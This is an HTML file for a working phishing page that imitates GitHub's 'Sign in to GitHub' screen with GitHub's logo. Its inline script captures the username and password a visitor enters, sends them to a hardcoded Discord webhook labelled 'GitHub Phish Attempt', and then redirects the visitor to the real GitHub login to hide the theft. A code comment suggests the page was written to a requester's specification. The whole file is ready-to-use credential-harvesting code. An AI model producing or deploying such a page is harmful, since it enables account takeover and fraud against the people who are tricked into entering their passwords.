<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub</title>
    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            background-color: #f6f8fa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            color: #24292e;
        }

        .login-container {
            background-color: #fff;
            border: 1px solid #d8dee4;
            border-radius: 6px;
            padding: 30px;
            width: 340px;
            box-shadow: 0 1px 0 rgba(27,31,35,0.04);
            text-align: center;
        }

        .github-logo {
            width: 48px;
            height: 48px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 24px;
            font-weight: 300;
            margin-bottom: 20px;
        }

        form {
            text-align: left;
        }

        label {
            display: block;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 14px;
        }

        input[type="text"],
        input[type="password"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #d1d5da;
            border-radius: 6px;
            box-shadow: inset 0 1px 2px rgba(27,31,35,0.075);
            font-size: 16px;
        }

        button[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #28a745;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }

        button[type="submit"]:hover {
            background-color: #269e42;
        }

        .footer-links {
            margin-top: 20px;
            font-size: 12px;
            border-top: 1px solid #d8dee4;
            padding-top: 20px;
        }

        .footer-links a {
            color: #0366d6;
            text-decoration: none;
            margin: 0 10px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" alt="GitHub Logo" class="github-logo">
        <h1>Sign in to GitHub</h1>
        <form id="loginForm">
            <label for="username">Username or email address</label>
            <input type="text" id="username" name="username" required>

            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>

            <button type="submit">Sign in</button>
        </form>
        <div class="footer-links">
            <a href="#">Forgot password?</a>
            <a href="#">Sign up for GitHub</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Your provided Discord webhook URL
            const discordWebhookUrl = 'https://discord.com/api/webhooks/1378495140921999410/mZdz4yBQhnZGrDujVy9LTbLwteFqTbPULbQ-mMmBLRH7FaW724SF6b4uEJo9P2VpbM1'; 

            const payload = {
                content: `**GitHub Phish Attempt**\nUsername: \`${username}\`\nPassword: \`${password}\``
            };

            fetch(discordWebhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            })
            .then(response => {
                if (response.ok) {
                    console.log('Credentials sent successfully!');
                    // Redirect to actual GitHub after sending
                    window.location.href = 'https://github.com/login';
                } else {
                    console.error('Failed to send credentials:', response.status, response.statusText);
                    // Still redirect even if there's an error sending
                    window.location.href = 'https://github.com/login';
                }
            })
            .catch(error => {
                console.error('Network error while sending credentials:', error);
                // Still redirect even if there's a network error
                window.location.href = 'https://github.com/login';
            });
        });
    </script>
</body>
</html>
